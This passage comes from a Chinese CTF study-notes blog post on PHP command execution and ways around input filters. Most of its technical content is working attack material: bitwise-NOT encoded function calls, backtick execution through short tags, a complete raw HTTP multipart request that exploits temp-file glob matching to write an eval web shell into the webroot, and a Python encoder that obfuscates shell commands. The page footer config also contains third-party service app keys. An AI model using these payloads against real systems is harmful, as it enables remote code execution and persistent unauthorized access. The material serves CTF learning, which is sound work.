<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="string">&#x27;Hello World&#x27;</span><span class="meta">?&gt;</span>    <span class="comment">// 输出 &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure>

<p>PHP中，反引号可以直接命令执行系统命令，但是如果想要输出执行结果还需要使用 echo 等函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>还可以使用<code>&lt;?= ?&gt;</code>短标签（比较灵活）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `ls /`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>?&gt;&lt;?=(反引号)&#123;$&#123;~&quot;%a0%b8%ba%ab&#125;[%a0]&#125;(反引号)?&gt;</code>	-&gt;	?&gt;&lt;?&#x3D;`$_GET[‘%a0’]&#96;</p>
<p>取反绕过，%a0是下划线</p>
<p>注意，POST方法%a0不会解码，用减号[-]代替[_]</p>
<h4 id="2-过滤下划线和"><a href="#2-过滤下划线和" class="headerlink" title="2.过滤下划线和$"></a>2.过滤下划线和$</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php7支持($a)()执行命令，(call_user_func)(system,whoami,&#x27;&#x27;);</span></span><br><span class="line">(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">93</span>%<span class="number">93</span>%a0%<span class="number">8</span>a%<span class="number">8</span>c%<span class="number">9</span>a%<span class="number">8</span>d%a0%<span class="number">99</span>%<span class="number">8</span>a%<span class="number">91</span>%<span class="number">9</span>c)(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>,~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>e%<span class="number">92</span>%<span class="number">96</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)();</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5利用/tmp文件-&gt;php??????</span></span><br><span class="line"><span class="comment">#匹配 ./???/????????[@-[]	筛选最后一位是大写字母从@到[,8个?</span></span><br><span class="line"><span class="comment">#强制用post上传一句话木马</span></span><br><span class="line">---------<span class="number">123</span></span><br><span class="line">Content-Disposition:<span class="keyword">from</span>-data:name=<span class="string">&quot;file&quot;</span>;filename=<span class="string">&quot;1.txt&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot;</span> &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line">---------<span class="number">123</span>-----</span><br></pre></td></tr></table></figure>

<p>!(..&#x2F;images&#x2F;命令执行&#x2F;16.png)</p>
<p>生成一个1.txt文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/???/????????[@-[]`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/17.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /class11/3.php?cmd=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.102.128:18080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------123</span><br><span class="line">Content-Disposition:from-data:name=&quot;file&quot;;filename=&quot;1.txt&quot; </span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot; &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line">----------123--</span><br></pre></td></tr></table></figure>

<p>注意：请求从GET换成POST，cmd后面和HTTP只能一个空格，cmd中的?,&gt;,&lt;,+不能url编码</p>
<p>由于最后一位不一定是大写，多执行几次！！！</p>
<p>Content-Type:multipart&#x2F;form-data;boundary&#x3D;——–123必须加上,上下横线数量必须相同，后面必须只有两个–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">----------123</span><br><span class="line">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">----------123--</span><br><span class="line">也可以直接执行系统命令！</span><br></pre></td></tr></table></figure>

<p>如果题目过滤了<code>@</code>，那么我们可以取<code>@</code>之前的一个字符，也就是<code>?</code>，即<code>%3f</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f/%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f[%<span class="number">3</span>f-[]`%<span class="number">3</span>b<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="；-过滤"><a href="#；-过滤" class="headerlink" title="；~ ^ &#96; &amp; | 过滤"></a>；~ ^ &#96; &amp; | 过滤</h4><p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/18.png"></p>
<p>只能用自增运算，分号全部用短标签替换</p>
<h4 id="如果下划线也过滤了"><a href="#如果下划线也过滤了" class="headerlink" title="如果下划线也过滤了"></a>如果下划线也过滤了</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> cmdx <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>((<span class="built_in">oct</span>(<span class="built_in">ord</span>(cmdx)))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span></span><br><span class="line">    ct = <span class="built_in">str</span>.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>)  <span class="comment">#将0,1替换为$&#123;#&#125;,$&#123;##&#125;</span></span><br><span class="line"></span><br><span class="line">    ct = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + ct + <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    charset = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> ctx <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> ctx.isprintable() <span class="keyword">and</span> ctx <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            charset.add(ctx)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc(<span class="string">&quot;ls&quot;</span>))</span><br></pre></td></tr></table></figure>

                
                <p class="end">__END__</p>
            </div>
            <div class="article-footer">
                <div class="suffix-box">
    <div class="suffix-box-left">
        <img src="/image/sidebar/RL02.jpg" alt="Dyinglight">
    </div>
    <div class="suffix-box-right">
        <span class="suffix-box-title">文章作者：</span>Dyinglight
        <br>
        <span class="suffix-box-title">文章出处：</span><a href="/article/1615743781/" target="_blank">php命令执行</a>
        <br>
        <span class="suffix-box-title">作者签名：</span>原神,启动！
        <br>
        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
        <br>
        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
        <br>
    </div>
    <div style="clear: both;"></div>
</div>
                
                
                    <div class="tag">
                        标签：
                        
                            <a href="/tag/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
                        
                    </div>
                
                <div class="article-prev-next">
                    
                        <a href="/article/862536289/" class="prev-prefix">« </a> 上一篇：    <a href="/article/862536289/" title="发布于 2024-04-27 12:42">SSSCTFwp-Dyinglight</a>
                        <br>
                    
                    
                        <a href="/article/3439035480/" class="next-prefix">» </a> 下一篇：    <a href="/article/3439035480/" title="发布于 2024-04-14 03:20">4.14文件上传刷题日记</a>
                    
                </div>
            </div>
            
    <div class="article-comments">
        
            <div class="comments-title">
                评论列表
            </div>
        
        <div class="comments-content"></div>
    </div>
    
 
        </div>
    
</div>
    <div id="footer">
    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>
</div>
    <div id="sidebar">
    <div class="menu-wrap" style="display:none;">
        
            <div class="menu-notice">
                <span class="iconfont icon-notice"></span>
                <div class="notice">
                    <span>ctf start！</span>
                </div>
            </div>
        
        <nav class="menu">
            <div class="menu-introduce"> 
                <div class="introduce-avatar">
                    <img src="/image/sidebar/RL02.jpg">
                </div> 
                <div class="introduce-info"> 
                    <div class="introduce-user">
                        
                            <a href="https://worstone.cn" target="_blank"><span>Dyinglight</span></a>
                        
                    </div>
                </div> 
            </div> 
            <div class="menu-list">
                <ul>
                    
                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
                    
                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
                    
                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                    
                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                    
                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                    
                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
                    
                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
                    
                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
                    
                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
                    
                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
                    
                </ul> 
            </div> 
            <div class="menu-link">
                <div class="box">
                    <div class="image-box"></div>
                </div>
                
                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
                
                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
                
                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.jpg"><span class="iconfont icon-qq"></span></a>
                
                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
                
                    <a name="GitHub" href="https://github.com/Dyinglight5" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
                
            </div> 
        </nav>
        <button class="menu-button-close"></button>
        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
            </svg>
        </div>
    </div>
    <button class="menu-button-open">MENU</button>
    <div class="menu-cover"></div>
</div>
    <link type="text/css" rel="stylesheet" href="/css/search.css">
<script type="text/javascript" src="/js/iscroll.js"></script>
<script type="text/javascript" src="/js/instantsearch.min.js"></script>
<div class="search-window">
    <div class="search-content">
        <div class="search-content-icon">
            <i class="iconfont icon-search"></i>
        </div>
        <div id="search-input" class="search-input"></div>
    </div>

    <div class="search-scroll">
        <div class="search-result">
            <div id="search-stats" class="search-stats"></div>
            <div id="search-hits"></div>
            <div id="search-pagination" class="search-pagination"></div>
        </div>
    </div>

    <span class="search-close-icon">
        <i class="iconfont icon-close"></i>
    </span>
</div>
    <div id="tools">
    <div class="progressbar-top"></div>
    
    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
    <script type="text/javascript" src="/js/APlayer.min.js"></script>
    <script type="text/javascript" src="/js/Meting.min.js"></script>
    <script>
        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
    </script>
    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>

    <div class="wrap-right">
    <div class="wrap-right-hide">
         <div class="wrap-right-button favorites">
            <div class="iconbox" switch="false">
                <span class="iconfont icon-favorites"></span>
            </div>
            <span class="icontext">关注</span>
         </div>
        <div class="wrap-right-button search">
            <div class="iconbox">
                <span class="iconfont icon-search-menu"></span>
            </div>
            <span class="icontext">搜索</span>
        </div>
        <div class="wrap-right-button menu-button">
            <div class="iconbox">
                <span class="iconfont icon-menu"></span>
            </div>
            <span class="icontext">菜单</span>
        </div>
        <div class="wrap-right-button mode">
            <div class="light">
                <div class="iconbox">
                    <span class="iconfont icon-daymode"></span>
                </div>
                <span class="icontext">浅色模式</span>
            </div>
            <div class="dark">
                <div class="iconbox">
                    <span class="iconfont icon-nightmode-fill"></span>
                </div>
                <span class="icontext">深色模式</span>
            </div>
        </div>
        <div class="wrap-right-button bottom">
            <div class="iconbox">
                <span class="iconfont icon-top"></span>
            </div>
            <span class="icontext">跳至底部</span>
        </div>
    </div>
    <div class="wrap-right-show">
        <div class="wrap-right-button set">
            <div class="iconbox">
                <span class="iconfont icon-setting"></span>
            </div>
            <span class="icontext">设置</span>
        </div>
        <div class="wrap-right-button top">
            <div class="iconbox">
                <span class="iconfont icon-top"></span>
            </div>
            <span class="icontext">返回顶部</span>
        </div>
    </div>
</div>
    <div class="loading"></div>
</div>
    <script>
    window.config = {
        GitHubUserName     : "Dyinglight5",
        GitHubRepositories : "Dyinglight5.github.io",

        User             : "Dyinglight",
        UserAvatar       : "/image/sidebar/RL02.jpg",
        WebsiteStartDate : "2024-03-24",
        Home             : "https://worstone.cn",

        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
        WebsiteTitleBlurTimeOut  : 500,
        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
        WebsiteTitleFocusTimeOut : 1000,
        WebsiteFavicon           : {
            light : "/image/website/logo/logo.png",
            dark  : "/image/website/logo/logo-dark.png"
        },

        ProgressBar : {
            id       : "topProgressBar",
            color    : "#77B6FF",
            height   : "2px",
            duration : 0.2
        },

        Loading: {
            rebound : {
                tension  : 16,
                friction : 5
            },
            spinner : {
                id     : "spinner",
                radius : 90,
                sides  : 3,
                depth  : 4,
                colors : {
                    background : "#F0F0F0",
                    stroke     : "#272633",
                    base       : "",
                    child      : "#272633"
                },
                alwaysForward : true,
                restAt        : 0.5,
                renderBase    : false
            }
        },

        HomeHeaderAnimationRendered : true,
        HomeHeaderAnimation         : {
            radius      : 15,
            density     : 0.2,
            color       : "rgba(255, 255, 255, .2)",
            clearOffset : 0.3
        },

        BackAnimationRendered          : true,
        IEBrowserBackAnimationRendered : false,
        BackAnimation                  : {
            colorSaturation  : "60%",
            colorBrightness  : "50%",
            colorAlpha       : 0.5,
            colorCycleSpeed  : 5,
            verticalPosition : "random",
            horizontalSpeed  : 200,
            ribbonCount      : 3,
            strokeSize       : 0,
            parallaxAmount   : -0.2,
            animateSections  : true
        },

        HomeHeaderImage : [
            
                "/image/header/elysia2.jpg",
            
                "/image/header/kiana1.png",
            
                "/image/header/home.jpeg",
            
        ],
        HomeBannerText  : "",

        ArticleHeaderImage : [
            
                "/image/header/article.jpg",
            
                "/image/header/home.jpeg",
            
        ],

        OtherBannerText : "",

        Error : {
            icon    : "icon-swimming",
            title   : "PAGE NOT FOUND",
            content : [
                
                    "很抱歉，您访问的页面不存在！",
                
                    "可能是输入地址有误或该地址已变更。",
                
            ],
            buttons : [
                
                    {
                        icon  : "icon-home",
                        text  : "返回首页",
                        href  : "/",
                        class : ""
                    },
                
            ]
        },

        MenuNotice : {
            enable : true,
            notice : "ctf start！",
            speed  : 20
        },
        MenuList : [
            
                {
                    name   : "首页",
                    icon   : "icon-home-fill",
                    href   : "/",
                    type   : "index",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "分类",
                    icon   : "icon-folder-fill",
                    href   : "/category",
                    type   : "category",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "标签",
                    icon   : "icon-discount-fill",
                    href   : "/tag",
                    type   : "tag",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "归档",
                    icon   : "icon-calendar-fill",
                    href   : "/archive",
                    type   : "archive",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "赞赏",
                    icon   : "icon-heart-fill",
                    href   : "/donate",
                    type   : "donate",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "关于",
                    icon   : "icon-about-fill",
                    href   : "/about",
                    type   : "about",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "订阅",
                    icon   : "icon-rss",
                    href   : "/atom.xml",
                    type   : "",
                    class  : "",
                    target : "_blank"
                },
            
                {
                    name   : "搜索",
                    icon   : "icon-search-menu",
                    href   : "javascript:;",
                    type   : "",
                    class  : "search",
                    target : "_self"
                },
            
                {
                    name   : "留言板",
                    icon   : "icon-comments-fill",
                    href   : "/comment",
                    type   : "comment",
                    class  : "",
                    target : "_self"
                },
            
                {
                    name   : "友情链接",
                    icon   : "icon-link",
                    href   : "/friend",
                    type   : "friend",
                    class  : "",
                    target : "_self"
                },
            
        ],
        MenuLink : [
            
                
                    {
                        name   : "知乎",
                        icon   : "icon-zhihu",
                        href   : "https://zhihu.com/people/worstone-29",
                        class  : "",
                        target : "_blank",
                        image  : ""
                    },
                
                    {
                        name   : "微博",
                        icon   : "icon-weibo",
                        href   : "https://weibo.com/u/5749847477",
                        class  : "",
                        target : "_blank",
                        image  : ""
                    },
                
                    {
                        name   : "QQ",
                        icon   : "icon-qq",
                        href   : "javascript:;",
                        class  : "image",
                        target : "_self",
                        image  : "/image/sidebar/qq.jpg"
                    },
                
                    {
                        name   : "微信",
                        icon   : "icon-wechat",
                        href   : "javascript:;",
                        class  : "",
                        target : "_self",
                        image  : ""
                    },
                
                    {
                        name   : "GitHub",
                        icon   : "icon-github",
                        href   : "https://github.com/Dyinglight5",
                        class  : "",
                        target : "_blank",
                        image  : ""
                    },
                
            
        ],

        FooterStyle : 2,
        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>",

        ConsoleList : [
            
                
                    [
                        
                            
                                "Based on cnblogs theme SimpleMemory.",
                            
                                "",
                            
                        
                    ],
                
                    [
                        
                            
                                "SimpleMemory Author:",
                            
                                "BNDong",
                            
                        
                    ],
                
                    [
                        
                            
                                "Theme:",
                            
                                "LiveForCode",
                            
                        
                    ],
                
            
        ],

        FontIconExtend : "",

        Donate : {
            paypal  : "",
            bitcoin : "",
            alipay  : "/image/donate/alipay.jpg",
            wechat  : "/image/donate/wechatpay.jpg"
        },

        Search : {
            applicationID : "010C3EANT8",
            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
            indexName     : "Notes",
            hits          : {
                page : 10
            },
            labels        : {
                placeholder : "搜索",
                empty       : "未发现与 「${query}」 相关的内容",
                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
            }
        }, 

        Comment : {
            switch : true,
            type   : "Valine",
        },

        Waline : {
            el              : ".comments-content",
            serverURL       : "",
            path            : window.location.pathname,
            meta            : "['nick', 'mail', 'link']",
            requiredMeta    : "['nick', 'mail']",
            pageSize        : 10,
            lang            : "zh-cn",
            locale: {
                admin       : "博主",
                anonymous   : "匿名用户",
                sofa        : "快来做第一个评论的人吧 ~",
                placeholder : "你是我一生只会遇见一次的惊喜...",
            },
            dark            : "html[color-scheme='dark']",
            search          : false,
            pageview        : true,
            comment         : true,
            copyright       : false,
        },

        Valine : {
            el             : ".comments-content",
            appId          : "SVxN9Sk9mzBk4tCi9470dhDQ-gzGzoHsz",
            appKey         : "BWGcit0aZ9zv8JeQWBB0eb2s",
            serverURLs     : "",
            placeholder    : "你是我一生只会遇见一次的惊喜...",
            avatar         : "mm",
            meta           : "nick,mail,link",
            requiredFields : "nick,mail",
            pageSize       : 5,
            lang           : "zh-cn",
            visitor        : true,
            enableQQ       : true
        },

        Tocbot : {
            switch                : true,
            tocSelector           : ".toc",
            contentSelector       : ".article-body",
            headingSelector       : "h1, h2, h3, h4, h5",
            headingsOffset        : 0,
            scrollSmooth          : true,
            scrollSmoothOffset    : -5,
            positionFixedSelector : ".toc",
            positionFixedClass    : "toc-fixed",
            fixedSidebarOffset    : "",
        },

        Require : {
            baseUrl     : "/js/",
            waitSeconds : 100
        },

        Music : {
            type : "Meting"
        },
        APlayer : {
            container : ".aplayer",
            fixed     : true,
            autoplay  : false,
            loop      : "all",
            order     : "random",
            preload   : "auto",
            volume    : 0.67,
            mutex     : true,
            lrcType   : 3,
            audio     : [
                
                    {
                        name   : "Endless Tears",
                        artist : "CLIFF EDGE",
                        cover  : "/music/cover/Endless Tears.jpg",
                        url    : "/music/song/Endless Tears.mp3",
                        lrc    : "/music/lrc/Endless Tears.lrc"
                    },
                
            ]
        },
        Meting : {
            api      : "https://api.i-meto.com/meting/api",
            id       : "3778678", 
            lrcshow  : false, 
            server   : "netease", 
            type     : "playlist", 
            fixed    : true, 
            autoplay : false, 
            loop     : "all", 
            order    : "random", 
            preload  : "auto", 
            volume   : 0.67, 
            mutex    : true
        },

        Mouse : {
            enable  : true,
            options : {
                size  : 6,
                sizeF : 24
            }
        },

        LazyLoad : {
            default : "/image/website/lazyload.svg"
        },
  
        Style : {
            aplayer          : "/css/APlayer.css",
            archive          : "/css/archive.css",
            base             : "/css/base.css",
            clipboard        : "/css/clipboard.css",
            code             : "/css/code.css",
            donate           : "/css/donate.css",
            fancybox         : "/css/jquery.fancybox.css",
            footer           : "/css/footer.css",
            iconfont         : "/iconfont/iconfont.css",
            index            : "/css/index.css",
            menuBubble       : "/css/menu-bubble.css",
            mouse            : "/css/mouse.css",
            page             : "/css/page.css",
            post             : "/css/post.css",
            search           : "/css/search.css",
            tocbot           : "/css/tocbot.css",
            valine           : "/css/valine.css",
            waline           : "/css/waline.css",
            walineCustom     : "/css/waline-custom.css"
        },

        Script: {
            aplayer          : "/js/APlayer.min.js",
            config           : "/js/require.config.js",
            index            : "/js/index.js",
            instantSearch    : "/js/instantsearch.min.js",
            iscroll          : "/js/iscroll.js",
            jQuery           : "/js/jquery-3.4.1.min.js",
            loading          : "/js/loading.js",
            meting           : "/js/Meting.min.js",
            require          : "/js/require.min.js",
            waline           : "/js/waline.mjs",
            pageview         : "/js/pageview.mjs",
            comment          : "/js/comment.mjs",
        },

        Font: {
            LongCang    : "/font/LongCang.css",
            Monda       : "/font/Monda.css",
            NotoSansSC  : "/font/NotoSansSC.css",
            NotoSerifSC : "/font/NotoSerifSC.css",
            Playball    : "/font/Playball.css",
            PTMono      : "/font/PTMono.css",
            Roboto      : "/font/Roboto.css",
            RobotoSlab  : "/font/RobotoSlab.css",
            Rosario     : "/font/Rosario.css",
            UbuntuMono  : "/font/UbuntuMono.css"
        },

        Suffix : {
            about : "原神,启动！"
        },
            
        Theme : {
            url  : "https://github.com/first19326/Hexo-LiveForCode",
            name : "Hexo - Live For Code"
        }  
    };
</script>
    <script type="text/javascript" src="/js/index.js"></script>
</body>
</html>